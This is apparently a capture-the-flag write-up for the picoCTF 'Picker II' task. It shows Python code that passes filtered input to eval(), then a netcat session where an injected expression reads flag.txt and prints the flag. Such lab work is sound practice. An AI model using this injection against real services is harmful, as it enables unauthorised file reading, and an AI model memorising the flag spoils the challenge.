#### Descripción 
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 52389`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/521/picker-II.py).
#### Solución
``` 
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
  
while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
rosyperez@MacBookAir pickerii % nc saturn.picoctf.net 52389                    
==> win()
Illegal input
==> print(open('flag.txt', 'r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
```
#### Notas
es una especie de inyección comprendiendo el funcionamieto del programa python cabe resaltar que no lo podemos modificar porque si lo ejecutamos en local no funcionará
#### Referencias
https://www.youtube.com/watch?v=Ujl5f4fgRPQ